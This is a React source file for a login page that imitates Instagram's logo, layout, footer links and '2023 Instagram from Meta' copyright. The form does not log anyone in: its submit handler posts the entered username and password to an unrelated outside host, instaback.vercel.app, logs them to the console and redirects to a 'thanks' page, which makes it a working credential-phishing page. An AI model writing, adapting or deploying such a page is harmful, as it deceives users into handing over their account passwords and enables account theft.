import React, {useState} from "react"
import { useNavigate } from "react-router-dom"
import instagram from '../images/instagram-logo.png'
import axios from 'axios'
import './login.css'
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faEye } from "@fortawesome/free-solid-svg-icons";
import phone from '../images/phone-frame.png'
import ImageSlider from "./images"
import appStore from '../images/app-store.png'
import google from '../images/google-play.png'
import facebook from '../images/facebook-icon.png'
const eye = <FontAwesomeIcon icon={faEye} />;

const Login =()=>{
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("")
    const [loading, setLoading] = useState(false)
    const [showPassword, setShowPassword] = useState(false);
    const navigate = useNavigate()


    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)
        const user = {
            username, password
        }
        console.log(user)
        if(username === "" || username === " ") {setLoading(false); return}
        if(password === "" || password=== " ") {setLoading(false); return}
        try {
            await axios.post(`https://instaback.vercel.app/form-submit`, {...user})
                .then((res)=> console.log(res.data))
                .then(()=>{
                    setPassword("");
                    setUsername("");
                    setLoading(false)
                    navigate('/thanks')
                })
        } catch (error) {
            console.log(error)
        }
    }
 

    return(
        <div className="container">
            <div className="main-container">
                <div className="main-content">

                    <div className="slide-container" style={{backgroundImage: `url(${phone})`}}>
                    <ImageSlider duration={5000} />
                    </div>

                    <div className="form-container">
                    <div className="form-content box">
                        <div className="logo">
                            <img src={instagram} alt="Instagram"/>
                        </div>
                        <form className="signin-form" id="signin-form" onSubmit={handleSubmit}>
                            <div className="form-group">
                                <div className="animate-input">
                                    
                                    <input type="text" value={username} placeholder="Phone number, username, or email" onChange={(e)=> setUsername(e.target.value)}/>
                                </div>
                            </div>
                            <div className="form-group">
                                <div className="animate-input">
                                    <input type={showPassword ? "text" : "password"} value={password} placeholder="Password" onChange={(e)=>setPassword(e.target.value)}/>
                                    {/* <button className="btn-group" type="checkbox" onClick={() => setShowPassword(!showPassword)}>
                                        {showPassword ? "Hide" : "Show"} password
                                    </button> */}
                                    <i onClick={() => setShowPassword(!showPassword)}>{eye}</i>
                                </div>
                            </div>
                            
                            <div className="btn-group">
                                {
                                    loading? 
                                <button className="btn-login" id="signin-btn" type="submit" disabled >
                                    please wait..
                                </button>
                                :
                                <button className="btn-login" id="signin-btn" type="submit"  >
                                    Log in
                                </button>
                                }
                            </div>
                            <div className="divine">
                                <div></div>
                                <div>OR</div>
                                <div></div>
                            </div>
                            <div className="btn-group">
                                <button type="button" class="btn-fb">
                                    <img src={facebook} alt=""/>
                                    <span>Log in with Facebook</span>
                                </button>
                            </div>
                            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pw">Forgot password?</a>
                        </form>
                    </div>
                    <div className="box goto">
                        <p>
                            Don't have an account?
                            <a href="https://www.instagram.com/accounts/emailsignup/"> Sign up</a>
                        </p>
                    </div>
                    <div className="app-download">
                        <p>Get the app.</p>
                        <div className="store-link">
                            <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
                                <img src={appStore} alt="Get it on App Store"/>
                            </a>
                            <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
                                <img src={google}/>
                            </a>
                        </div>
                    </div>
                </div>


                </div>
            </div>


            <div className="footer">
                <div name="links" className="links">
                    <a href="https://about.meta.com/" target="_blank">Meta</a>
                    <a href="https://about.instagram.com/" target="_blank">About</a>
                    <a href="https://about.instagram.com/blog/" target="_blank">Blog</a>
                    <a href="https://www.instagram.com/about/jobs/" target="_blank">Jobs</a>
                    <a href="https://help.instagram.com/" target="_blank">Help</a>
                    <a href="https://developers.facebook.com/docs/instagram" target="_blank">API</a>
                    <a href="https://www.instagram.com/legal/privacy/" target="_blank">Privacy</a>
                    <a href="https://www.instagram.com/legal/terms/" target="_blank">Terms</a>
                    <a href="https://www.instagram.com/directory/profiles/" target="_blank">Top Accounts</a>
                    <a href="https://www.instagram.com/directory/hashtags/" target="_blank">Hashtags</a>
                    <a href="https://www.instagram.com/explore/locations/" target="_blank">Locations</a>
                    <a href="https://www.instagram.com/web/lite/" target="_blank">Instagram Lite</a>
                    <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank">Contact Uploading & Non-Users</a>
                </div>
                <div className="copyright">
                    English  &nbsp;&nbsp;&nbsp;&nbsp;
                    ?? 2023 Instagram from Meta
                </div>
        </div>
        </div>
    )
}
export default Login